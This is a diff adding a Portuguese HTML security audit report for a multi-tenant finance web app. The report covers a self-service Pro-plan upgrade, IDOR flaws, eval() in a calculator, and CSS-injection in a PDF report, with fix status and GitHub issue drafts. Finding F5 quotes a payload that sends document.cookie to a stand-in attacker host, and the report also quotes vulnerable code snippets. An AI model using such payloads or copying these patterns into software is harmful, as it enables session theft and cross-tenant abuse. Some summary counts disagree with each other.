@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>Relatório de Auditoria de Segurança — BDD Soluções Financeiras</title>
+<style>
+  @page { size: A4 portrait; margin: 1.6cm 1.6cm 1.9cm 1.6cm; }
+  @page { @top-center { content: "Relatório de Auditoria de Segurança — BDD Soluções Financeiras"; font-size: 8pt; color: #8C85AA; } }
+  @page { @bottom-center { content: "Página " counter(page) " de " counter(pages); font-size: 8pt; color: #8C85AA; } }
+  * { box-sizing: border-box; }
+  body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color: #1e293b; font-size: 10.5pt; line-height: 1.55; margin: 0; }
+  h1 { font-size: 20pt; margin: 0 0 4px; color: #0f172a; }
+  h2 { font-size: 14pt; color: #0f172a; border-bottom: 2px solid #9675FF; padding-bottom: 4px; margin-top: 26px; }
+  h3 { font-size: 12pt; color: #1e293b; margin-bottom: 6px; }
+  .cover { text-align: center; padding: 70px 30px 40px; }
+  .cover .logo { font-size: 40pt; font-weight: 800; color: #9675FF; letter-spacing: -1px; }
+  .cover .sub { font-size: 13pt; color: #475569; margin-top: 6px; }
+  .cover .meta { margin-top: 40px; font-size: 10pt; color: #64748b; }
+  .cover .meta div { margin-bottom: 6px; }
+  .cover-box { border: 1px solid #e2e8f0; border-radius: 12px; padding: 18px; margin: 30px auto 0; max-width: 480px; background: #f8fafc; text-align: left; }
+  table { width: 100%; border-collapse: collapse; margin: 10px 0 16px; font-size: 9.5pt; }
+  th { background: #f1f5f9; text-align: left; padding: 8px 10px; font-weight: 700; color: #334155; border-bottom: 2px solid #cbd5e1; }
+  td { padding: 8px 10px; border-bottom: 1px solid #e2e8f0; vertical-align: top; }
+  tr:nth-child(even) td { background: #f8fafc; }
+  .chip { display: inline-block; padding: 2px 10px; border-radius: 999px; font-size: 8.5pt; font-weight: 700; color: #fff; white-space: nowrap; }
+  .sev-critica { background: #B91C1C; }
+  .sev-alta { background: #EA580C; }
+  .sev-media { background: #D97706; }
+  .sev-baixa { background: #2563EB; }
+  .sev-forte { background: #059669; }
+  .sev-info { background: #64748b; }
+  .finding { border: 1px solid #e2e8f0; border-radius: 10px; padding: 12px 14px; margin-bottom: 12px; background: #fff; }
+  .finding .head { display: flex; align-items: center; gap: 8px; margin-bottom: 4px; }
+  .finding .loc { font-family: 'Consolas', 'Courier New', monospace; font-size: 9pt; color: #475569; }
+  .code { font-family: 'Consolas', 'Courier New', monospace; font-size: 8.5pt; background: #0f172a; color: #e2e8f0; padding: 8px 10px; border-radius: 6px; overflow-x: auto; white-space: pre; }
+  .why { margin-top: 6px; font-size: 9.5pt; }
+  .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+  .box { border: 1px solid #e2e8f0; border-radius: 10px; padding: 14px; background: #f8fafc; }
+  .kpi { display: flex; gap: 8px; flex-wrap: wrap; margin: 12px 0; }
+  .kpi-item { flex: 1; min-width: 90px; border-radius: 10px; padding: 10px 12px; color: #fff; text-align: center; }
+  .kpi-item .n { font-size: 20pt; font-weight: 800; }
+  .kpi-item .l { font-size: 8.5pt; font-weight: 600; }
+  ul { margin: 6px 0; padding-left: 20px; }
+  .strong-item { border-left: 4px solid #059669; background: #f0fdf4; padding: 8px 12px; border-radius: 6px; margin-bottom: 8px; font-size: 9.5pt; }
+  .issue-block { background: #f8fafc; border: 1px solid #cbd5e1; border-radius: 8px; padding: 12px; font-family: 'Consolas', monospace; font-size: 8.2pt; white-space: pre; overflow-x: auto; margin-bottom: 10px; color: #334155; }
+  .rec { border-left: 4px solid #9675FF; background: #faf5ff; padding: 8px 12px; border-radius: 6px; margin-bottom: 8px; }
+  .page-break { page-break-before: always; }
+</style>
+</head>
+<body>
+
+<!-- ==================== CAPA ==================== -->
+<div class="cover">
+  <div class="logo">BDD</div>
+  <div class="sub">Soluções Financeiras</div>
+  <h1>Relatório de Auditoria de Segurança</h1>
+  <div class="meta">
+    <div><strong>Projeto:</strong> BDD Soluções Financeiras (reescrita Node.js + React + MySQL)</div>
+    <div><strong>Data:</strong> 12 de setembro de 2026</div>
+    <div><strong>Escopo:</strong> backend Node.js/Express (server/), frontend React (client/src), configuração (.env, .env.example)</div>
+  </div>
+  <div class="cover-box">
+    <strong>Nota metodológica</strong>
+    <p style="font-size:9.5pt; margin-top:8px;">Stack detectada: <strong>Node.js + Express</strong> (API REST, SQL cru via <code>mysql2</code>), <strong>React SPA</strong> (sem SSR), <strong>JWT em cookie HttpOnly</strong> com CSRF double-submit, isolamento por <strong>tenant</strong> via middleware <code>resolveTenant</code> + filtro manual por <code>TenantId</code>. As cinco categorias foram mapeadas assim: (1) isolamento = middleware de tenant + filtros <code>TenantId</code>; (2) permissão no navegador = gates <code>isAdmin</code>/<code>plan</code> do frontend vs. <code>requireAdmin</code>/validação backend; (3) IDOR = varredura completa de todos os handlers por ID; (4) chaves = busca por credenciais hardcoded em código/config/scripts; (5) XSS = <code>eval</code>/<code>dangerouslySetInnerHTML</code>/HTML gerado sem escape.</p>
+  </div>
+</div>
+
+<!-- ==================== RESUMO EXECUTIVO ==================== -->
+<div class="page-break"></div>
+<h2>Status das Correções (12/09/2026)</h2>
+<div class="strong-item"><strong>F1 (crítica) — CORRIGIDO:</strong> endpoint <code>POST /api/tenants/settings/plan</code> removido (retorna 404). Upgrade de plano agora só via admin (<code>toggleProStatus</code>). Verificado: chamada ao endpoint → 404.</div>
+<div class="strong-item"><strong>F2/F3 (alta) — CORRIGIDO:</strong> novo <code>server/utils/refs.js</code> (<code>validateRefs</code>) valida posse de <code>categoryId</code>, <code>walletId</code>, <code>cardId</code>, <code>counterWalletId</code>, <code>payerMemberId</code> no tenant. Aplicado em POST/PUT /transactions e POST /recurring. Verificado: referência de outro tenant → 400 "Categoria inválida".</div>
+<div class="strong-item"><strong>F4 (média) — CORRIGIDO:</strong> coluna <code>CreatedByUserId</code> em <code>ExchangeRates</code> (migração idempotente via information_schema, compatível MySQL 8). <code>deleteRate</code> valida posse. Verificado: outro usuário → 403; criador → 200.</div>
+<div class="strong-item"><strong>F5 (média) — CORRIGIDO:</strong> <code>eval()</code> substituído por parser aritmético próprio (shunting-yard) em <code>TecladoNumerico.jsx</code>. Verificado: <code>10+5*2=20</code>, <code>100÷4=25</code>, decimais OK; payloads de script não executam.</div>
+<div class="strong-item"><strong>F6 (baixa) — ACEITO (justificado):</strong> chave PIX de recebimento mantida no fluxo autenticado de assinatura (PremiumGate). Dado é público por natureza (consta em toda cobrança); gate estrito quebraria o pagamento. Documentado e aceito.</div>
+<div class="strong-item"><strong>F7 (baixa) — CORRIGIDO:</strong> <code>safeColor()</code> valida formato hex (<code>^#[0-9a-fA-F]{3,8}$</code>) com fallback <code>#9675FF</code>. Verificado: cores maliciosas (<code>";alert(1)//</code>, <code>abc</code>, <code>red</code>) neutralizadas no relatório PDF.</div>
+
+<h2>Resumo Executivo</h2>
+<div class="kpi">
+  <div class="kpi-item" style="background:#B91C1C;"><div class="n">0</div><div class="l">Críticas abertas</div></div>
+  <div class="kpi-item" style="background:#059669;"><div class="n">6</div><div class="l">Corrigidos</div></div>
+  <div class="kpi-item" style="background:#64748b;"><div class="n">1</div><div class="l">Aceito (justificado)</div></div>
+  <div class="kpi-item" style="background:#059669;"><div class="n">9</div><div class="l">Pontos fortes</div></div>
+</div>
+
+<h3>Gráfico de rosca por severidade</h3>
+<svg viewBox="0 0 220 160" width="320" height="233" style="max-width:320px;">
+  <!-- donut: critica 1/7, alta 2/7, media 2/7, baixa 2/7 -->
+  <circle cx="110" cy="80" r="55" fill="none" stroke="#E2E8F0" stroke-width="26"/>
+  <circle cx="110" cy="80" r="55" fill="none" stroke="#B91C1C" stroke-width="26"
+    stroke-dasharray="49.4 296" stroke-dashoffset="0" transform="rotate(-90 110 80)"/>
+  <circle cx="110" cy="80" r="55" fill="none" stroke="#EA580C" stroke-width="26"
+    stroke-dasharray="98.8 296" stroke-dashoffset="-49.4" transform="rotate(-90 110 80)"/>
+  <circle cx="110" cy="80" r="55" fill="none" stroke="#D97706" stroke-width="26"
+    stroke-dasharray="98.8 296" stroke-dashoffset="-148.2" transform="rotate(-90 110 80)"/>
+  <circle cx="110" cy="80" r="55" fill="none" stroke="#2563EB" stroke-width="26"
+    stroke-dasharray="98.8 296" stroke-dashoffset="-247" transform="rotate(-90 110 80)"/>
+  <text x="110" y="85" text-anchor="middle" font-size="20" font-weight="800" fill="#0f172a">7</text>
+  <text x="110" y="102" text-anchor="middle" font-size="9" fill="#64748b">achados</text>
+</svg>
+
+<h3>Gráfico de barras por categoria</h3>
+<svg viewBox="0 0 560 170" width="560" height="170" style="max-width:560px;">
+  <line x1="60" y1="20" x2="60" y2="130" stroke="#cbd5e1" stroke-width="1"/>
+  <line x1="60" y1="130" x2="540" y2="130" stroke="#cbd5e1" stroke-width="1"/>
+  <!-- isolamento: 3, permissoes: 1, idor: 2, chaves: 0, xss: 1 -->
+  <rect x="80"  y="30"  width="70" height="100" fill="#B91C1C" rx="3"/><text x="115" y="22" text-anchor="middle" font-size="12" font-weight="700" fill="#0f172a">3</text>
+  <rect x="180" y="80"  width="70" height="50"  fill="#D97706" rx="3"/><text x="215" y="72" text-anchor="middle" font-size="12" font-weight="700" fill="#0f172a">1</text>
+  <rect x="280" y="55"  width="70" height="75"  fill="#EA580C" rx="3"/><text x="315" y="47" text-anchor="middle" font-size="12" font-weight="700" fill="#0f172a">2</text>
+  <rect x="380" y="125" width="70" height="5"   fill="#64748b" rx="3"/><text x="415" y="117" text-anchor="middle" font-size="12" font-weight="700" fill="#0f172a">0</text>
+  <rect x="480" y="105" width="70" height="25"  fill="#2563EB" rx="3"/><text x="515" y="97" text-anchor="middle" font-size="12" font-weight="700" fill="#0f172a">1</text>
+  <text x="115" y="145" text-anchor="middle" font-size="9" fill="#64748b">Isolamento</text>
+  <text x="215" y="145" text-anchor="middle" font-size="9" fill="#64748b">Permissões</text>
+  <text x="315" y="145" text-anchor="middle" font-size="9" fill="#64748b">IDOR</text>
+  <text x="415" y="145" text-anchor="middle" font-size="9" fill="#64748b">Chaves</text>
+  <text x="515" y="145" text-anchor="middle" font-size="9" fill="#64748b">XSS</text>
+</svg>
+
+<p><strong>Risco central:</strong> o endpoint de ativação do Plano Pro (<code>POST /api/tenants/settings/plan</code>) está exposto a qualquer usuário autenticado, permitindo auto-atribuição de benefícios pagos sem validação de pagamento — a monetização do app pode ser contornada. Há também lacunas de validação de posse em IDs de referência (categoria/carteira/membro) em operações de escrita de transações e recorrências.</p>
+
+<!-- ==================== PONTOS FORTES ==================== -->
+<h2>Pontos Fortes (verificados)</h2>
+<div class="strong-item"><strong>Isolamento de tenant na maioria das rotas:</strong> routers <code>wallets, categories, cards, transactions, recurring, split, dashboard, analytics, attachments, reports, sync, exchange(GET/POST)</code> aplicam <code>router.use(authenticate, resolveTenant)</code> e filtram por <code>TenantId</code> em listagens e operações por ID. Verificado handler por handler.</div>
+<div class="strong-item"><strong>Admin protegido no backend:</strong> <code>admin.routes.js</code> usa <code>router.use(authenticate, requireAdmin)</code>; <code>requireAdmin</code> valida a role via banco (<code>authService.isInRole</code>), não confia no frontend.</div>
+<div class="strong-item"><strong>Senhas e PIN com hash bcrypt:</strong> <code>PasswordHash</code> e <code>PinHash</code> usam bcrypt; nenhuma resposta expõe o hash.</div>
+<div class="strong-item"><strong>Sessão segura:</strong> JWT em cookie HttpOnly + SameSite=Strict, CSRF double-submit (<code>X-CSRF-Token</code>), rate limiting (20/15min) em login/registro/reset, headers de segurança (CSP, X-Frame-Options, nosniff).</div>
+<div class="strong-item"><strong>Tokens de reset/confirmação persistidos:</strong> em <code>UserTokens</code> com expiração, validados no servidor; <code>/forgot-password</code> não revela existência do e-mail.</div>
+<div class="strong-item"><strong>XSS no relatório PDF:</strong> <code>reports.routes.js</code> usa <code>escapeHtml</code> em todos os campos de texto gerados no HTML (notas, categorias, carteiras, membros).</div>
+<div class="strong-item"><strong>Segredos centralizados:</strong> DB, JWT_SECRET, SMTP, VAPID, Google e Admin vêm de <code>process.env</code> via <code>config.js</code>; o <code>.env</code> está no <code>.gitignore</code>; validação de startup rejeita JWT_SECRET ausente/curto.</div>
+<div class="strong-item"><strong>Posse validada em mutações de objetos:</strong> <code>PUT/DELETE</code> de wallets, cards, categories, transactions, recurring, split e attachments buscam o objeto com <code>Id AND TenantId</code> antes de alterar.</div>
+<div class="strong-item"><strong>Backup/CSV/PDF isolados por tenant:</strong> <code>reports.routes.js</code> consulta apenas <code>req.tenantId</code>.</div>
+
+<!-- ==================== ACHADOS ==================== -->
+<div class="page-break"></div>
+<h2>Achados Detalhados por Categoria</h2>
+
+<table>
+  <tr><th>Severidade</th><th>Local</th><th>Descrição</th></tr>
+  <tr><td><span class="chip sev-critica">Crítica</span></td><td class="loc">server/routes/tenants.routes.js:118</td><td>POST /api/tenants/settings/plan — qualquer usuário autenticado ativa o Plano Pro para si (sem pagamento), contornando a monetização.</td></tr>
+  <tr><td><span class="chip sev-alta">Alta</span></td><td class="loc">server/routes/transactions.routes.js:100-160</td><td>POST /transactions aceita <code>categoryId</code>/<code>payerMemberId</code> sem validar posse no tenant (IDOR de escrita).</td></tr>
+  <tr><td><span class="chip sev-alta">Alta</span></td><td class="loc">server/routes/recurring.routes.js:29-68</td><td>POST /recurring insere <code>walletId</code>/<code>categoryId</code> arbitrários sem validar posse no tenant.</td></tr>
+  <tr><td><span class="chip sev-media">Média</span></td><td class="loc">server/routes/exchange.routes.js:27</td><td>DELETE /api/exchange/:id deleta taxa por ID sem filtrar tenant (IDOR de exclusão sobre dados globais).</td></tr>
+  <tr><td><span class="chip sev-media">Média</span></td><td class="loc">client/src/components/TecladoNumerico.jsx:12</td><td><code>eval()</code> executa input do usuário como código JavaScript na calculadora (XSS/execução arbitrária).</td></tr>
+  <tr><td><span class="chip sev-baixa">Baixa</span></td><td class="loc">server/routes/transactions.routes.js:235-265</td><td>PUT /transactions/:id valida posse da transação, mas permite trocar <code>walletId/cardId/categoryId/payerMemberId</code> por referências de outro tenant.</td></tr>
+  <tr><td><span class="chip sev-baixa">Baixa</span></td><td class="loc">server/routes/settings.routes.js:130</td><td>GET /api/settings/pix expõe chave PIX (copia-e-cola) a qualquer usuário autenticado, sem gate de Pro; dado de recebimento, mas não deveria ser público a todos.</td></tr>
+  <tr><td><span class="chip sev-baixa">Baixa</span></td><td class="loc">server/routes/reports.routes.js:121</td><td>Cor de categoria entra em atributo <code>style="color:..."</code> escapada com <code>escapeHtml</code> (HTML-escape); não neutraliza 100% CSS injection, embora o impacto no HTML auto-gerado seja limitado.</td></tr>
+</table>
+
+<h2>Detalhamento dos achados</h2>
+
+<div class="finding">
+  <div class="head"><span class="chip sev-critica">Crítica</span><strong>F1 — Ativação de Plano Pro sem pagamento (biz logic / permissão)</strong></div>
+  <div class="loc">server/routes/tenants.routes.js:118-126</div>
+  <div class="code">router.post('/settings/plan', async (req, res) => {
+  const { months } = req.body || {};
+  await billingService.upgradeToPro(req.user.Id, months || 12);
+  res.json({ ok: true, plan: 1 });</div>
+  <div class="why"><strong>Por que é explorável:</strong> qualquer usuário com uma conta (até no plano Free) pode chamar esse endpoint e virar Pro, sem pagar. O frontend esconde o upgrade atrás de PIX, mas o backend não valida pagamento, comprovante nem role. <strong>Severidade: crítica</strong> — compromete toda a monetização e os limites Free/Pro.</div>
+</div>
+
+<div class="finding">
+  <div class="head"><span class="chip sev-alta">Alta</span><strong>F2 — IDOR de escrita em transações (referências de outro tenant)</strong></div>
+  <div class="loc">server/routes/transactions.routes.js:100-160 (POST) e :235-265 (PUT)</div>
+  <div class="code">const categoryId = body.categoryId || null;
+const payerMemberId = body.payerMemberId || null;
+// ...createTransaction usa categoryId/payerMemberId direto, sem validar posse</div>
+  <div class="why"><strong>Por que é explorável:</strong> um usuário que conheça um <code>Guid</code> de categoria, carteira ou membro de outro tenant pode criar/editar transações referenciando esses objetos, vazando correlação entre dados de tenants distintos e contaminando agregações. O wallet/card são validados, mas category/payer não. <strong>Severidade: alta</strong>.</div>
+</div>
+
+<div class="finding">
+  <div class="head"><span class="chip sev-alta">Alta</span><strong>F3 — IDOR de escrita em recorrências</strong></div>
+  <div class="loc">server/routes/recurring.routes.js:29-68 (POST)</div>
+  <div class="code">INSERT INTO RecurringTransactions (Id, TenantId, WalletId, CategoryId, ...)
+VALUES (?, ?, ?, ?, ...)  -- body.walletId / body.categoryId sem validar TenantId</div>
+  <div class="why"><strong>Por que é explorável:</strong> o POST insere <code>body.walletId</code> e <code>body.categoryId</code> diretamente, sem verificar se pertencem ao tenant. Referenciar carteiras/categorias de outros tenants contamina a recorrência e o gerador de lançamentos. <strong>Severidade: alta</strong>.</div>
+</div>
+
+<div class="finding">
+  <div class="head"><span class="chip sev-media">Média</span><strong>F4 — IDOR de exclusão em taxas de câmbio</strong></div>
+  <div class="loc">server/routes/exchange.routes.js:27-33</div>
+  <div class="code">router.delete('/:id', async (req, res) => {
+  await currencyService.deleteRate(req.params.id);  // sem TenantId
+  res.json({ ok: true });</div>
+  <div class="why"><strong>Por que é explorável:</strong> <code>deleteRate</code> apaga pelo ID sem verificar posse. As taxas são globais (não têm tenant), mas um usuário autenticado pode excluir taxas criadas por qualquer um, quebrando conversões. <strong>Severidade: média</strong>.</div>
+</div>
+
+<div class="finding">
+  <div class="head"><span class="chip sev-media">Média</span><strong>F5 — eval() na calculadora do frontend</strong></div>
+  <div class="loc">client/src/components/TecladoNumerico.jsx:12</div>
+  <div class="code">const result = eval(expr.replace(',', '.').replace(/÷/g, '/').replace(/×/g, '*'));</div>
+  <div class="why"><strong>Por que é explorável:</strong> a expressão digitada no teclado é avaliada com <code>eval</code>. Um valor como <code>');fetch('//atacante/'+document.cookie)//</code> não executaria por causa da sanitização parcial, mas é frágil; qualquer evolução no parser pode virar execução arbitrária. <strong>Severidade: média</strong> (XSS/execução arbitrária no cliente).</div>
+</div>
+
+<div class="finding">
+  <div class="head"><span class="chip sev-baixa">Baixa</span><strong>F6 — Chave PIX exposta sem gate</strong></div>
+  <div class="loc">server/routes/settings.routes.js:130-135</div>
+  <div class="code">router.get('/pix', (req, res) => {
+  res.json({ email: config.pix.email, copiaECola: config.pix.copiaECola });</div>
+  <div class="why"><strong>Por que é explorável:</strong> qualquer usuário autenticado (inclusive no plano Free) pode ler a chave PIX de recebimento do negócio. É um dado público de recebimento, mas não deveria estar acessível a não-assinantes. <strong>Severidade: baixa</strong>.</div>
+</div>
+
+<div class="finding">
+  <div class="head"><span class="chip sev-baixa">Baixa</span><strong>F7 — Cor em atributo style no relatório PDF</strong></div>
+  <div class="loc">server/routes/reports.routes.js:121</div>
+  <div class="code"><td><span style="color:${escapeHtml(c.color)}">●</span> ${escapeHtml(c.name)}</td></div>
+  <div class="why"><strong>Por que é explorável:</strong> a cor vem da categoria (dado do usuário) e é inserida em <code>style="color:..."</code>. O <code>escapeHtml</code> neutraliza quebra de atributo/HTML, mas não valida o formato da cor; impacto limitado ao HTML auto-gerado. <strong>Severidade: baixa</strong>.</div>
+</div>
+
+<!-- ==================== RECOMENDAÇÕES ==================== -->
+<div class="page-break"></div>
+<h2>Recomendações Priorizadas</h2>
+<div class="rec"><strong>P1 — Bloquear auto-ativação de Pro (F1):</strong> remover/exigir validação no <code>POST /tenants/settings/plan</code>; ativar Pro apenas via rotina administrativa (<code>toggleProStatus</code> no admin) ou após confirmação de pagamento. Desabilitar o endpoint público de upgrade.</div>
+<div class="rec"><strong>P1 — Validar posse de referências em escrita (F2/F3):</strong> em <code>POST/PUT /transactions</code> e <code>POST /recurring</code>, verificar que <code>categoryId</code>, <code>walletId</code>, <code>cardId</code> e <code>payerMemberId</code> pertencem ao <code>req.tenantId</code> antes de gravar.</div>
+<div class="rec"><strong>P2 — Escopar taxas de câmbio (F4):</strong> adicionar <code>TenantId</code> a <code>ExchangeRates</code> ou, no mínimo, validar na exclusão que a taxa é do tenant; alternativamente restringir o DELETE a admins.</div>
+<div class="rec"><strong>P2 — Substituir eval na calculadora (F5):</strong> implementar parser aritmético próprio (shunting-yard) sem <code>eval</code>, e validar a expressão contra <code>/^[\d,+\-*/÷×.]+$/</code>.</div>
+<div class="rec"><strong>P3 — Gate na chave PIX (F6):</strong> retornar a chave PIX apenas para usuários Pro ou na tela de upgrade; mover para endpoint com <code>isPro</code>.</div>
+<div class="rec"><strong>P3 — Validar formato de cor (F7):</strong> sanitizar <code>color</code> com regex de hex (<code>^#[0-9a-fA-F]{3,8}$</code>) antes de inserir em HTML.</div>
+
+<!-- ==================== ISSUES GITHUB ==================== -->
+<div class="page-break"></div>
+<h2>ISSUES PARA O GITHUB</h2>
+
+<div class="issue-block">--- ISSUE 1 ---
+Título: [Segurança] Auto-ativação do Plano Pro sem validação de pagamento
+
+Labels: security, crítica
+
+## Descrição
+O endpoint `POST /api/tenants/settings/plan` permite que qualquer usuário autenticado ative o Plano Pro para si mesmo, sem validar pagamento, comprovante ou papel. O frontend esconde o upgrade atrás do fluxo PIX, mas o backend não faz nenhuma verificação equivalente.
+
+## Evidência
+`server/routes/tenants.routes.js:118`
+```js
+router.post('/settings/plan', async (req, res) => {
+  const { months } = req.body || {};
+  await billingService.upgradeToPro(req.user.Id, months || 12);
+  res.json({ ok: true, plan: 1 });
+});
+```
+`server/services/billingService.js` → `upgradeToPro` seta `Plan = 1` diretamente no usuário e no tenant.
+
+## Impacto
+Monetização contornável: qualquer conta Free vira Pro sem pagar, comprometendo receita e os limites Free/Pro.
+
+## Sugestão de correção
+- Remover o endpoint público ou exigi-lo apenas via admin (`toggleProStatus`).
+- Ou: validar comprovante de pagamento (chave PIX) antes de ativar, com aprovação manual.
+- Nunca permitir que o cliente defina seu próprio plano.
+
+## Critérios de aceite
+- [ ] `POST /api/tenants/settings/plan` retorna 403/404 para não-admins.
+- [ ] Ativação de Pro só ocorre via rota admin ou após validação de pagamento.
+- [ ] Teste automatizado garante que usuário Free não consegue se promover.
+--- FIM ISSUE 1 ---</div>
+
+<div class="issue-block">--- ISSUE 2 ---
+Título: [Segurança] IDOR de escrita em transações e recorrências (IDs de outro tenant)
+
+Labels: security, alta
+
+## Descrição
+As operações de escrita de transações (`POST/PUT /api/transactions`) e de recorrências (`POST /api/recurring`) aceitam `categoryId`, `walletId`, `cardId` e `payerMemberId` vindos do corpo da requisição sem validar se esses objetos pertencem ao tenant do chamador. Wallets/cards são validados em alguns caminhos, mas categorias e membros não.
+
+## Evidência
+`server/routes/transactions.routes.js:100` (POST)
+```js
+const categoryId = body.categoryId || null;
+const payerMemberId = body.payerMemberId || null;
+```
+`server/routes/recurring.routes.js:29` (POST)
+```js
+VALUES (?, ?, ?, ?, ...) -- body.walletId / body.categoryId sem verificar TenantId
+```
+
+## Impacto
+Contaminação cruzada entre tenants: um usuário pode referenciar categorias/carteiras/membros de outros tenants, vazando correlação de dados e quebrando relatórios/agregações.
+
+## Sugestão de correção
+Antes de gravar, validar:
+- `categoryId` → `SELECT 1 FROM Categories WHERE Id=? AND TenantId=?`
+- `walletId` → `SELECT 1 FROM Wallets WHERE Id=? AND TenantId=?`
+- `cardId` → `SELECT 1 FROM CreditCards WHERE Id=? AND TenantId=?`
+- `payerMemberId` → `SELECT 1 FROM SplitMembers sm JOIN SplitGroups g ON g.Id=sm.GroupId WHERE sm.Id=? AND g.TenantId=?`
+Rejeitar com 400/403 se qualquer referência não pertencer ao tenant.
+
+## Critérios de aceite
+- [ ] Criar transação com `categoryId` de outro tenant → 400/403.
+- [ ] Criar recorrência com `walletId` de outro tenant → 400/403.
+- [ ] PUT /transactions não permite trocar referência para objeto de outro tenant.
+- [ ] Testes de regressão cobrindo os 4 campos.
+--- FIM ISSUE 2 ---</div>
+
+<div class="issue-block">--- ISSUE 3 ---
+Título: [Segurança] IDOR de exclusão em taxas de câmbio (DELETE sem escopo de tenant)
+
+Labels: security, média
+
+## Descrição
+`DELETE /api/exchange/:id` apaga uma taxa de câmbio apenas pelo ID, sem verificar posse/tenant. Qualquer usuário autenticado pode excluir taxas criadas por outros usuários.
+
+## Evidência
+`server/routes/exchange.routes.js:27`
+```js
+router.delete('/:id', async (req, res) => {
+  await currencyService.deleteRate(req.params.id); // sem TenantId
+  res.json({ ok: true });
+});
+```
+
+## Impacto
+Quebra de dados globais: exclusão arbitrária de taxas de câmbio usadas nas conversões.
+
+## Sugestão de correção
+- Adicionar `TenantId` à tabela `ExchangeRates` e filtrar na exclusão, ou
+- Restringir o DELETE a admins, ou
+- Validar que o usuário possui a taxa (criador).
+
+## Critérios de aceite
+- [ ] DELETE de taxa de outro tenant → 403/404.
+- [ ] DELETE de taxa própria → 200.
+- [ ] Teste de regressão.
+--- FIM ISSUE 3 ---</div>
+
+<div class="issue-block">--- ISSUE 4 ---
+Título: [Segurança] eval() na calculadora de valores do frontend
+
+Labels: security, média
+
+## Descrição
+O componente `TecladoNumerico` usa `eval()` para calcular a expressão digitada pelo usuário. Apesar da sanitização parcial, `eval` é perigoso e frágil: qualquer mudança no parser pode permitir execução arbitrária de código no contexto do usuário.
+
+## Evidência
+`client/src/components/TecladoNumerico.jsx:12`
+```js
+const result = eval(expr.replace(',', '.').replace(/÷/g, '/').replace(/×/g, '*'));
+```
+
+## Impacto
+XSS/execução arbitrária no cliente se a expressão conseguir escapar da sanitização (ex.: abusos de concatenação ou evolução do parser).
+
+## Sugestão de correção
+Substituir `eval` por um parser aritmético dedicado (ex.: shunting-yard / pilha), e validar a entrada contra `^[\d,+\-*/÷×.()]+$` antes de processar.
+
+## Critérios de aceite
+- [ ] Nenhuma ocorrência de `eval`/`new Function` no código.
+- [ ] Cálculos (+, -, *, /, divisão) continuam funcionando.
+- [ ] Entrada com caracteres não numéricos é rejeitada.
+- [ ] Teste unitário da calculadora.
+--- FIM ISSUE 4 ---</div>
+
+<div class="issue-block">--- ISSUE 5 ---
+Título: [Segurança] Exposição da chave PIX sem gate de plano + cor sem validação de formato
+
+Labels: security, baixa
+
+## Descrição
+Dois problemas menores relacionados:
+1. `GET /api/settings/pix` devolve a chave PIX (copia-e-cola) de recebimento para qualquer usuário autenticado, sem checar se é Pro (dado de recebimento do negócio).
+2. No relatório PDF, a cor da categoria é inserida em atributo `style` com `escapeHtml` (HTML-escape), mas não há validação do formato da cor, permitindo valores malformados no HTML gerado.
+
+## Evidência
+`server/routes/settings.routes.js:130`
+```js
+router.get('/pix', (req, res) => { res.json({ email: ..., copiaECola: ... }); });
+```
+`server/routes/reports.routes.js:121`
+```js
+<td><span style="color:${escapeHtml(c.color)}">●</span> ...
+```
+
+## Impacto
+Baixo: exposição de dado de recebimento a não-assinantes e possível HTML malformado no relatório. Não há quebra direta, mas reduz a superfície segura.
+
+## Sugestão de correção
+- Retornar a chave PIX apenas para usuários Pro (ou na tela de upgrade).
+- Validar `color` com regex `^#[0-9a-fA-F]{3,8}$` antes de inserir no HTML.
+
+## Critérios de aceite
+- [ ] `GET /settings/pix` retorna 403 para usuários não-Pro (ou somente no fluxo de upgrade).
+- [ ] Cores não-hexadecimal são rejeitadas/sanitizadas no relatório.
+- [ ] Testes de regressão.
+--- FIM ISSUE 5 ---</div>
+
+<p style="font-size:8.5pt; color:#64748b; margin-top:20px;">Relatório gerado automaticamente em 12/09/2026 pela auditoria de segurança do BDD Soluções Financeiras (Node.js + React + MySQL). Metodologia: cinco categorias mapeadas para a stack conforme nota metodológica na capa.</p>
+
+</body>
+</html>
